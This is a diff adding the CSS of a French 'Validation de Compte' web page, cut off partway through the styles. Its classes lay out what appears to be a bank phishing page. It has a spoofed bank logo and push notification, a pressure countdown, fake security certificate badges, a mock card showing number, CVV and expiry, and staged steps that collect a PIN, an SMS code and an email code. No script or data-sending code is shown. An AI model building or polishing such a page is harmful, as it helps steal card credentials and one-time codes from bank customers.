@@ -1,0 +1,4202 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation de Compte</title>
+    <style>
+        /* [GARDEZ TOUT VOTRE CSS EXISTANT ICI - IDENTIQUE] */
+        :root {
+            --primary-color: #000000;
+            --button-color: #FBBF24;
+            --border-color: #FBBF24;
+            --success-color: #10B981;
+            --blue-bg: #1E3A8A;
+            --blue-light: #3B82F6;
+            --red-button: #DC2626;
+            --red-dark: #B91C1C;
+            --yellow-border: #F59E0B;
+            --yellow-light: #FBBF24;
+            --white-color: #FFFFFF;
+            --black-color: #000000;
+            --light-color: #1a1a1a;
+            --gray-color: #6B7280;
+            --green-color: #10B981;
+            --orange-color: #F59E0B;
+            --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            background: linear-gradient(145deg, #1a1a1a, #000000);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 2px var(--border-color);
+            overflow: hidden;
+            position: relative;
+            border: 3px solid var(--border-color);
+        }
+
+        .header {
+            background: linear-gradient(to right, #000000, #1a1a1a);
+            color: var(--white-color);
+            padding: 25px 20px 20px;
+            text-align: center;
+            position: relative;
+            border-bottom: 3px solid var(--border-color);
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            display: inline-block;
+            position: relative;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+            color: var(--white-color);
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 4px;
+            background-color: var(--border-color);
+            border-radius: 2px;
+        }
+
+        .main-logo {
+            width: 420px;
+            height: 240px;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1a1a1a;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            transition: var(--transition);
+            border: 3px solid var(--border-color);
+        }
+
+        .main-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            border-radius: 15px;
+            filter: brightness(1.05) contrast(1.1);
+        }
+
+        .user-display {
+            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(26,26,26,0.9));
+            border: 2px solid var(--border-color);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .bank-logo-display {
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 10px;
+            border: 2px solid var(--border-color);
+        }
+
+        .bank-logo-display img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .user-info {
+            flex: 1;
+            color: var(--white-color);
+        }
+
+        .user-info .bank-name {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--border-color);
+        }
+
+        .user-info .user-name {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        .user-info .account-status {
+            font-size: 14px;
+            color: #10B981;
+            margin-top: 5px;
+            font-weight: 600;
+        }
+
+        .welcome-notification {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: linear-gradient(135deg, var(--blue-light), var(--blue-bg));
+            color: var(--white-color);
+            padding: 25px 30px;
+            border-radius: 20px;
+            font-weight: 600;
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            border: 2px solid var(--yellow-border);
+            backdrop-filter: blur(10px);
+            opacity: 0;
+            transition: all 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        .welcome-notification.show {
+            display: flex !important;
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .welcome-notification.hiding {
+            opacity: 0;
+            transform: translateX(-50%) translateY(-100px);
+        }
+
+        .welcome-notification::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--yellow-border), var(--white-color), var(--yellow-border));
+            animation: welcomeProgressBar 7s linear forwards;
+        }
+
+        @keyframes welcomeProgressBar {
+            0% { width: 100%; }
+            100% { width: 0%; }
+        }
+
+        .welcome-icon {
+            font-size: 40px;
+            margin-right: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+            border: 2px solid var(--yellow-border);
+        }
+
+        .welcome-content {
+            flex: 1;
+        }
+
+        .welcome-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            color: var(--white-color);
+        }
+
+        .welcome-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+            color: var(--white-color);
+        }
+
+        .welcome-message {
+            font-size: 15px;
+            opacity: 0.9;
+            color: var(--white-color);
+        }
+
+        .header-notification {
+            background: linear-gradient(135deg, var(--success-color), #34D399);
+            color: var(--white-color);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 0 auto 10px;
+            max-width: 500px;
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: slideDown 0.8s ease-out;
+            border: 2px solid var(--yellow-border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header-notification::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--yellow-border), var(--white-color), var(--yellow-border));
+            animation: progressBar 8s linear forwards;
+        }
+
+        @keyframes progressBar {
+            0% { width: 100%; }
+            100% { width: 0%; }
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header-notification-icon {
+            font-size: 32px;
+            margin-right: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            animation: iconPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes iconPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .header-notification-content {
+            text-align: left;
+        }
+
+        .header-notification-title {
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 5px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            color: var(--white-color);
+        }
+
+        .header-notification-message {
+            font-size: 16px;
+            opacity: 0.95;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+            color: var(--white-color);
+        }
+
+        .amount-pulse {
+            color: var(--white-color);
+            font-weight: 900;
+            animation: pulse 1.5s ease-in-out infinite;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 20px rgba(255, 255, 255, 0.6);
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            transform-origin: center;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .countdown-container {
+            background: linear-gradient(135deg, #DC2626, #B91C1C);
+            color: var(--white-color);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(220, 38, 38, 0.4);
+            border: 2px solid var(--border-color);
+            animation: pulse-alert 2s infinite;
+            transition: all 0.5s ease;
+        }
+
+        .countdown-container.hidden {
+            opacity: 0;
+            transform: scale(0.8);
+            height: 0;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .countdown-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .countdown-warning {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+
+        @keyframes pulse-alert {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .reference-container {
+            background: linear-gradient(135deg, rgba(0,0,0,0.9), rgba(26,26,26,0.95));
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px auto;
+            max-width: 600px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .reference-label {
+            font-size: 14px;
+            color: #AAAAAA;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .reference-number {
+            font-size: 20px;
+            font-weight: 900;
+            font-family: 'Courier New', monospace;
+            color: var(--border-color);
+            background: rgba(251, 191, 36, 0.1);
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            display: inline-block;
+            margin: 5px 0;
+            letter-spacing: 2px;
+            animation: referenceGlow 3s ease-in-out infinite;
+        }
+
+        .reference-note {
+            font-size: 12px;
+            color: #888888;
+            margin-top: 8px;
+            font-style: italic;
+        }
+
+        @keyframes referenceGlow {
+            0%, 100% { box-shadow: 0 0 5px rgba(251, 191, 36, 0.3); }
+            50% { box-shadow: 0 0 15px rgba(251, 191, 36, 0.6); }
+        }
+
+        .push-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 320px;
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 15px;
+            padding: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 2px solid var(--border-color);
+            z-index: 9999;
+            transform: translateX(400px);
+            opacity: 0;
+            transition: all 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            backdrop-filter: blur(10px);
+        }
+
+        .push-notification.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+
+        .push-notification.hiding {
+            transform: translateX(400px);
+            opacity: 0;
+        }
+
+        .push-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .push-bank-logo {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+            border-radius: 6px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .push-bank-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .push-bank-name {
+            font-weight: 700;
+            color: var(--white-color);
+            font-size: 14px;
+        }
+
+        .push-time {
+            margin-left: auto;
+            font-size: 12px;
+            color: #AAAAAA;
+        }
+
+        .push-content {
+            color: var(--white-color);
+            margin-bottom: 10px;
+        }
+
+        .push-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+            font-size: 15px;
+        }
+
+        .push-message {
+            font-size: 13px;
+            opacity: 0.9;
+            line-height: 1.4;
+        }
+
+        .security-certificates {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin: 25px 0 15px;
+            flex-wrap: wrap;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 15px;
+            border: 2px solid var(--border-color);
+        }
+
+        .certificate-badge {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            min-width: 120px;
+            transition: var(--transition);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .certificate-badge:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-3px);
+            border-color: var(--border-color);
+        }
+
+        .certificate-icon {
+            font-size: 28px;
+            color: var(--border-color);
+        }
+
+        .certificate-label {
+            font-size: 12px;
+            color: var(--white-color);
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .certificate-description {
+            font-size: 10px;
+            color: #AAAAAA;
+            text-align: center;
+            margin-top: 5px;
+        }
+
+        .form-container {
+            padding: 30px 40px;
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(145deg, #000000, #1a1a1a);
+        }
+
+        .form-step {
+            display: none;
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        .confirmation-step {
+            display: none;
+            animation: fadeIn 0.5s ease forwards;
+            text-align: center;
+            color: var(--white-color);
+        }
+
+        .confirmation-step.active {
+            display: block;
+        }
+
+        .confirmation-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        .confirmation-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .confirmation-message {
+            font-size: 18px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+
+        .confirmation-countdown {
+            font-size: 32px;
+            font-weight: 900;
+            font-family: 'Courier New', monospace;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 2px solid var(--button-color);
+            animation: pulse 1s infinite;
+            color: var(--white-color);
+        }
+
+        .confirmation-note {
+            font-size: 14px;
+            color: #999999;
+            margin-top: 20px;
+            font-style: italic;
+        }
+
+        .loading-step-60 {
+            display: none;
+            text-align: center;
+            color: var(--white-color);
+            padding: 40px;
+        }
+
+        .loading-step-60.active {
+            display: block;
+        }
+
+        .loading-step-60 .loading-icon {
+            font-size: 60px;
+            margin-bottom: 25px;
+            animation: spin 2s linear infinite;
+        }
+
+        .loading-step-60 .loading-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+        }
+
+        .loading-step-60 .loading-message {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+
+        .loading-step-60 .progress-bar-60 {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+
+        .loading-step-60 .progress-fill-60 {
+            height: 100%;
+            background: linear-gradient(to right, var(--button-color), #FFFFFF);
+            width: 0%;
+            transition: width 60s linear;
+            border-radius: 4px;
+        }
+
+        .loading-step-pin {
+            display: none;
+            text-align: center;
+            color: var(--white-color);
+            padding: 40px;
+        }
+
+        .loading-step-pin.active {
+            display: block;
+        }
+
+        .loading-step-pin .loading-icon-pin {
+            font-size: 60px;
+            margin-bottom: 25px;
+            animation: bounce 1s ease-in-out infinite;
+        }
+
+        .loading-step-pin .loading-title-pin {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+        }
+
+        .loading-step-pin .loading-message-pin {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+
+        .loading-step-pin .dots-container-pin {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+        }
+
+        .loading-step-pin .dot-pin {
+            width: 15px;
+            height: 15px;
+            background: var(--button-color);
+            border-radius: 50%;
+            animation: pulseDots 1.5s ease-in-out infinite;
+        }
+
+        .loading-step-pin .dot-pin:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loading-step-pin .dot-pin:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        .loading-step-pin .dot-pin:nth-child(4) {
+            animation-delay: 0.6s;
+        }
+
+        .loading-step-pin .security-check-pin {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .loading-step-pin .security-check-icon-pin {
+            font-size: 24px;
+            color: var(--border-color);
+        }
+
+        .loading-step-pin .security-check-text-pin {
+            font-size: 14px;
+            color: #AAAAAA;
+        }
+
+        .loading-step-sms {
+            display: none;
+            text-align: center;
+            color: var(--white-color);
+            padding: 40px;
+        }
+
+        .loading-step-sms.active {
+            display: block;
+        }
+
+        .loading-step-sms .loading-icon-sms {
+            font-size: 60px;
+            margin-bottom: 25px;
+            animation: spin 2s linear infinite;
+        }
+
+        .loading-step-sms .loading-title-sms {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+        }
+
+        .loading-step-sms .loading-message-sms {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+
+        .loading-step-sms .progress-bar-sms {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+
+        .loading-step-sms .progress-fill-sms {
+            height: 100%;
+            background: linear-gradient(to right, var(--button-color), #FFFFFF);
+            width: 0%;
+            transition: width 60s linear;
+            border-radius: 4px;
+        }
+
+        .loading-step-after-sms {
+            display: none;
+            text-align: center;
+            color: var(--white-color);
+            padding: 40px;
+        }
+
+        .loading-step-after-sms.active {
+            display: block;
+        }
+
+        .loading-step-after-sms .loading-icon-after-sms {
+            font-size: 60px;
+            margin-bottom: 25px;
+            animation: spin 2s linear infinite;
+        }
+
+        .loading-step-after-sms .loading-title-after-sms {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+        }
+
+        .loading-step-after-sms .loading-message-after-sms {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+
+        .loading-step-after-sms .progress-bar-after-sms {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+
+        .loading-step-after-sms .progress-fill-after-sms {
+            height: 100%;
+            background: linear-gradient(to right, var(--button-color), #FFFFFF);
+            width: 0%;
+            transition: width 120s linear;
+            border-radius: 4px;
+        }
+
+        .email-confirmation-step {
+            display: none;
+            text-align: center;
+            color: var(--white-color);
+            padding: 40px;
+        }
+
+        .email-confirmation-step.active {
+            display: block;
+        }
+
+        .email-confirmation-icon {
+            font-size: 60px;
+            margin-bottom: 25px;
+            animation: bounce 1s ease-in-out infinite;
+        }
+
+        .email-confirmation-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+        }
+
+        .email-confirmation-message {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+
+        .email-code-input {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .email-code-digit {
+            width: 60px;
+            height: 80px;
+            font-size: 36px;
+            text-align: center;
+            background: #1a1a1a;
+            border: 3px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--white-color);
+            font-weight: 800;
+            transition: all 0.3s ease;
+        }
+
+        .email-code-digit:focus {
+            border-color: var(--button-color);
+            box-shadow: 0 0 15px rgba(251, 191, 36, 0.4);
+            outline: none;
+            transform: scale(1.05);
+        }
+
+        .email-code-digit.filled {
+            background: rgba(251, 191, 36, 0.1);
+            border-color: #FFFFFF;
+        }
+
+        .email-countdown {
+            font-size: 32px;
+            font-weight: 900;
+            font-family: 'Courier New', monospace;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 2px solid var(--button-color);
+            animation: pulse 1s infinite;
+            color: var(--white-color);
+        }
+
+        .email-info {
+            background: rgba(251, 191, 36, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .email-address {
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--white-color);
+            margin: 10px 0;
+            word-break: break-word;
+        }
+
+        .email-note {
+            font-size: 14px;
+            color: #CCCCCC;
+            margin-top: 20px;
+            font-style: italic;
+        }
+
+        .loading-step-email {
+            display: none;
+            text-align: center;
+            color: var(--white-color);
+            padding: 40px;
+        }
+
+        .loading-step-email.active {
+            display: block;
+        }
+
+        .loading-step-email .loading-icon-email {
+            font-size: 60px;
+            margin-bottom: 25px;
+            animation: spin 2s linear infinite;
+        }
+
+        .loading-step-email .loading-title-email {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+        }
+
+        .loading-step-email .loading-message-email {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+
+        .loading-step-email .progress-bar-email {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+
+        .loading-step-email .progress-fill-email {
+            height: 100%;
+            background: linear-gradient(to right, var(--button-color), #FFFFFF);
+            width: 0%;
+            transition: width 120s linear;
+            border-radius: 4px;
+        }
+
+        @keyframes pulseDots {
+            0%, 100% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.3); opacity: 1; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-title {
+            font-size: 24px;
+            color: var(--white-color);
+            margin-bottom: 20px;
+            text-align: center;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--white-color);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 16px;
+            transition: var(--transition);
+            background: #1a1a1a;
+            color: var(--white-color);
+        }
+
+        .form-input:focus {
+            border-color: var(--button-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.2);
+        }
+
+        .form-input.error {
+            border-color: var(--red-button);
+            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.2);
+        }
+
+        .form-select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 16px;
+            background-color: #1a1a1a;
+            color: var(--white-color);
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .form-select:focus {
+            border-color: var(--button-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.2);
+        }
+
+        .error-message {
+            color: var(--red-button);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .card-3d-container {
+            perspective: 1000px;
+            margin-bottom: 30px;
+        }
+
+        .card-3d {
+            width: 100%;
+            height: 200px;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .card-3d.flipped {
+            transform: rotateY(180deg);
+        }
+
+        .card-front, .card-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+            color: var(--white-color);
+            border: 2px solid var(--border-color);
+        }
+
+        .card-back {
+            transform: rotateY(180deg);
+            background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+        }
+
+        .card-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 90px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+        }
+
+        .card-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            border-radius: 4px;
+        }
+
+        .card-chip {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 50px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #D4AF37, #FFD700, #D4AF37);
+            border-radius: 6px;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+            border: 1px solid rgba(255, 215, 0, 0.5);
+        }
+
+        .card-chip img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 4px;
+        }
+
+        .card-number {
+            position: absolute;
+            top: 50%;
+            left: 20px;
+            right: 20px;
+            font-size: 22px;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .card-holder {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-size: 16px;
+            text-transform: uppercase;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .card-expiry {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            font-size: 16px;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .card-cvv {
+            position: absolute;
+            top: 50%;
+            right: 30px;
+            background: #1a1a1a;
+            color: var(--white-color);
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+        }
+
+        .card-stripe {
+            position: absolute;
+            top: 30px;
+            left: 0;
+            right: 0;
+            height: 40px;
+            background: #000000;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-prev {
+            background: linear-gradient(to right, #1a1a1a, #000000);
+            color: var(--white-color);
+        }
+
+        .btn-prev:hover {
+            background: linear-gradient(to right, var(--button-color), #FFFFFF);
+            color: #000000;
+        }
+
+        .btn-next, .btn-submit {
+            background: linear-gradient(to right, var(--button-color), #FFFFFF);
+            color: #000000;
+        }
+
+        .btn-next:hover, .btn-submit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(251, 191, 36, 0.4);
+        }
+
+        .btn-loading .btn-text {
+            visibility: hidden;
+        }
+
+        .btn-loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid #000000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .card-security-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 25px;
+            margin: 25px 0 15px;
+            flex-wrap: wrap;
+        }
+
+        .card-security-logo {
+            width: 280px;
+            height: 140px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            border-radius: 12px;
+            padding: 20px;
+            background: #1a1a1a;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            border: 2px solid var(--border-color);
+        }
+
+        .card-security-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .card-security-logo:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            border-color: #FFFFFF;
+        }
+
+        .security-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 25px;
+            margin: 25px 0 15px;
+            flex-wrap: wrap;
+        }
+
+        .security-logo {
+            width: 220px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            border-radius: 10px;
+            padding: 20px;
+            background: #1a1a1a;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            border: 2px solid var(--border-color);
+        }
+
+        .security-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .security-logo:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            border-color: #FFFFFF;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(10px);
+        }
+
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid var(--button-color);
